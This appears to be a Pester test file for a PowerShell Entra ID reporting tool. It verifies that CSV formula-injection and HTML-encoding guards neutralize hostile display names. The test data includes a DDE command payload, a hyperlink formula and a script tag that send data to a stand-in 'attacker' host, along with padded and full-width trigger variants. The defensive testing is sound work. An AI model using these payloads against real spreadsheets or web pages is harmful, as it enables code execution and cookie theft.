#Requires -Version 7.4
#Requires -Modules Pester

# Covers the two output-sanitization controls.
#
# Both exist for the same reason: directory display names are attacker-influenceable in
# any tenant that permits self-service profile edits or B2B invites, and this tool's
# whole output is files that somebody else opens: a manager in Excel, a client in a
# browser. These are the regression tests for controls whose failure is silent.

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    . (Import-ScriptFunction -Path (Get-AssessmentScriptPath) -Name @(
            'Protect-CsvInjection'
            'ConvertTo-SafeHtml'
        ))
}

Describe 'Protect-CsvInjection' {

    Context 'Formula-triggering leading characters' {

        $dangerous = @(
            @{ Value = '=cmd|''/c calc''!A1'; Label = 'equals (DDE payload)' }
            @{ Value = '=HYPERLINK("http://attacker/","Click")'; Label = 'equals (exfil hyperlink)' }
            @{ Value = '+1234567890'; Label = 'plus' }
            @{ Value = '-1+1'; Label = 'minus' }
            @{ Value = '@SUM(A1:A9)'; Label = 'at' }
            @{ Value = "`tSomething"; Label = 'tab' }
            @{ Value = "`rSomething"; Label = 'carriage return' }
        )

        It 'neutralizes a display name starting with <Label>' -TestCases $dangerous {
            $result = [PSCustomObject]@{ DisplayName = $Value } | Protect-CsvInjection

            $result.DisplayName | Should -BeExactly ("'" + $Value)
        }
    }

    Context 'Values that must be left alone' {

        It 'does not touch an ordinary display name' {
            $result = [PSCustomObject]@{ DisplayName = 'Rowan Ellis' } | Protect-CsvInjection
            $result.DisplayName | Should -BeExactly 'Rowan Ellis'
        }

        It 'does not touch a UPN' {
            $result = [PSCustomObject]@{ UserPrincipalName = 'rowan.ellis@contoso.com' } | Protect-CsvInjection
            $result.UserPrincipalName | Should -BeExactly 'rowan.ellis@contoso.com'
        }

        It 'does not touch a name that merely contains a dangerous character later on' {
            $result = [PSCustomObject]@{ DisplayName = 'Ellis=Rowan' } | Protect-CsvInjection
            $result.DisplayName | Should -BeExactly 'Ellis=Rowan'
        }

        It 'leaves booleans as booleans so the CSV keeps its types' {
            $result = [PSCustomObject]@{ IsAdmin = $true } | Protect-CsvInjection
            $result.IsAdmin | Should -BeOfType [bool]
            $result.IsAdmin | Should -BeTrue
        }

        It 'leaves an empty string alone' {
            $result = [PSCustomObject]@{ PhoneMethodsRegistered = '' } | Protect-CsvInjection
            $result.PhoneMethodsRegistered | Should -BeExactly ''
        }

        It 'leaves nulls alone' {
            $result = [PSCustomObject]@{ RegistrationReportLastUpdatedUtc = $null } | Protect-CsvInjection
            $result.RegistrationReportLastUpdatedUtc | Should -BeNullOrEmpty
        }
    }

    Context 'Shape of the output' {

        It 'preserves property order, because column order is the report layout' {
            $row = [PSCustomObject][ordered]@{
                Risk = 'Critical'; Reason = 'because'; DisplayName = 'Rowan Ellis'; UserId = 'abc'
            }

            $result = $row | Protect-CsvInjection

            $result.PSObject.Properties.Name | Should -Be @('Risk', 'Reason', 'DisplayName', 'UserId')
        }

        It 'processes every row of a collection' {
            $rows = @(
                [PSCustomObject]@{ DisplayName = '=EVIL()' }
                [PSCustomObject]@{ DisplayName = 'Safe Name' }
                [PSCustomObject]@{ DisplayName = '@ALSO_EVIL()' }
            )

            $result = @($rows | Protect-CsvInjection)

            $result.Count | Should -Be 3
            $result[0].DisplayName | Should -BeExactly "'=EVIL()"
            $result[1].DisplayName | Should -BeExactly 'Safe Name'
            $result[2].DisplayName | Should -BeExactly "'@ALSO_EVIL()"
        }

        It 'guards every string property, not just the first' {
            $row = [PSCustomObject][ordered]@{
                DisplayName = '=A1'; Reason = '+B2'; UserPrincipalName = 'fine@contoso.com'
            }

            $result = $row | Protect-CsvInjection

            $result.DisplayName | Should -BeExactly "'=A1"
            $result.Reason | Should -BeExactly "'+B2"
            $result.UserPrincipalName | Should -BeExactly 'fine@contoso.com'
        }
    }
}

Describe 'ConvertTo-SafeHtml' {

    It 'encodes a script tag in a display name' {
        $encoded = ConvertTo-SafeHtml '<script>fetch("http://attacker/"+document.cookie)</script>'

        $encoded | Should -Not -Match '<script'
        $encoded | Should -Match '&lt;script&gt;'
    }

    It 'encodes an attribute-breaking payload' {
        $encoded = ConvertTo-SafeHtml '" onmouseover="alert(1)'

        $encoded | Should -Not -Match '(?<!&quot;)"'
        $encoded | Should -Match '&quot;'
    }

    It 'encodes ampersands so entities cannot be smuggled through' {
        ConvertTo-SafeHtml '&lt;script&gt;' | Should -Be '&amp;lt;script&amp;gt;'
    }

    It 'returns an empty string for null rather than the word null' {
        ConvertTo-SafeHtml $null | Should -BeExactly ''
    }

    It 'renders non-string values as their string form' {
        ConvertTo-SafeHtml 42 | Should -BeExactly '42'
        ConvertTo-SafeHtml $true | Should -BeExactly 'True'
    }

    It 'leaves an ordinary name readable' {
        ConvertTo-SafeHtml 'Rowan Ellis' | Should -BeExactly 'Rowan Ellis'
    }

    It "encodes an apostrophe in a name to an entity that still renders as an apostrophe" {
        # O'Brien is a real name and appears in real tenants. HtmlEncode emits &#39;,
        # which a browser renders as an apostrophe, so the client report stays readable
        # while the character cannot break out of a single-quoted attribute.
        ConvertTo-SafeHtml "Niamh O'Brien" | Should -BeExactly 'Niamh O&#39;Brien'
    }
}

Describe 'Protect-CsvInjection cannot be bypassed by padding or look-alike triggers' {

    # Precautionary beyond the unpadded ASCII triggers above: LibreOffice 24.2 was observed
    # to evaluate only an unpadded "=", and Excel's handling of these forms is unverified.
    # The guard looks past leading whitespace and control characters and recognises the
    # full-width triggers, and only ever prefixes, so the original text is kept intact.

    It 'neutralizes <Label>' -TestCases @(
        @{ Label = 'a leading space before =';      Value = ' =1+1' }
        @{ Label = 'several spaces before +';       Value = '   +1+1' }
        @{ Label = 'a line feed';                   Value = "`n=1+1" }
        @{ Label = 'CR LF before =';                Value = "`r`n=1+1" }
        @{ Label = 'a tab before @';                Value = "`t@SUM(A1)" }
        @{ Label = 'a no-break space before -';     Value = ([string][char]0x00A0 + '-1+1') }
        @{ Label = 'a control character before =';  Value = ([string][char]0x01 + '=1+1') }
        @{ Label = 'a full-width equals';           Value = ([string][char]0xFF1D + '1+1') }
        @{ Label = 'a full-width plus';             Value = ([string][char]0xFF0B + '1+1') }
        @{ Label = 'a full-width minus';            Value = ([string][char]0xFF0D + '1+1') }
        @{ Label = 'a full-width at';               Value = ([string][char]0xFF20 + 'SUM(A1)') }
        @{ Label = 'a space before a full-width equals'; Value = (' ' + [string][char]0xFF1D + '1') }
    ) {
        ([PSCustomObject]@{ DisplayName = $Value } | Protect-CsvInjection).DisplayName | Should -BeExactly ("'" + $Value)
    }

    It 'leaves <Label> alone' -TestCases @(
        @{ Label = 'a name with a leading space'; Value = ' Rowan Ellis' }
        @{ Label = 'a hyphenated name';           Value = 'Mary-Jane Ellis' }
        @{ Label = 'a name with a comma';         Value = 'Ellis, Rowan' }
        @{ Label = 'whitespace only';             Value = '   ' }
    ) {
        ([PSCustomObject]@{ DisplayName = $Value } | Protect-CsvInjection).DisplayName | Should -BeExactly $Value
    }

    It 'keeps embedded delimiters, quotes and line breaks inside one field' {
        # Export-Csv quotes every field and doubles embedded quotes; this confirms a hostile
        # value cannot open a new cell or row in the file the tool writes.
        $path = Join-Path ([System.IO.Path]::GetTempPath()) "csv-$(New-Guid).csv"
        try {
            $hostile = 'Ellis","=1+1' + "`n" + '=2+2,"x'
            [PSCustomObject]@{ DisplayName = $hostile; Upn = 'r@contoso-example.com' } | Protect-CsvInjection |
                Export-Csv -LiteralPath $path -NoTypeInformation -Encoding utf8BOM
            $back = @(Import-Csv -LiteralPath $path)
            $back.Count | Should -Be 1
            @($back[0].PSObject.Properties.Name) | Should -Be @('DisplayName', 'Upn')
            $back[0].DisplayName | Should -BeExactly $hostile
            $back[0].Upn | Should -BeExactly 'r@contoso-example.com'
        }
        finally { Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue }
    }
}

Describe 'Every CSV the project writes uses the same guard' {

    BeforeAll {
        function Get-GuardText {
            param([string]$Path)
            $ast = [System.Management.Automation.Language.Parser]::ParseFile((Resolve-Path -LiteralPath $Path).Path, [ref]$null, [ref]$null)
            $found = @($ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] -and
                        $args[0].Name -eq 'Protect-CsvInjection'
                    }, $true))
            $found.Count | Should -Be 1 -Because "$Path must define exactly one Protect-CsvInjection"
            (($found[0].Extent.Text -split "`n") | ForEach-Object { $_.TrimEnd() -replace '^\s+', '' }) -join "`n"
        }
        $script:Reference = Get-GuardText -Path (Get-AssessmentScriptPath)
    }

    # File names, not helper calls: test cases are built during discovery, before BeforeAll
    # has defined the helpers.
    It 'defines an identical guard in <Name>' -TestCases @(
        @{ Name = 'the sweep'; Script = 'Invoke-EntraSmsVoiceSweep.ps1' }
        @{ Name = 'the comparison script'; Script = 'Compare-EntraSmsVoiceAssessment.ps1' }
    ) {
        Get-GuardText -Path (Join-Path (Split-Path -Parent $PSScriptRoot) $Script) | Should -Be $script:Reference
    }

    It 'routes the sweep summary through it' {
        (Get-Content -LiteralPath (Get-SweepScriptPath) -Raw) | Should -Match '\[PSCustomObject\]\$clone \| Protect-CsvInjection'
    }

    It 'routes the comparison export through it' {
        (Get-Content -LiteralPath (Get-CompareScriptPath) -Raw) | Should -Match '\| Protect-CsvInjection \| Export-Csv'
    }
}
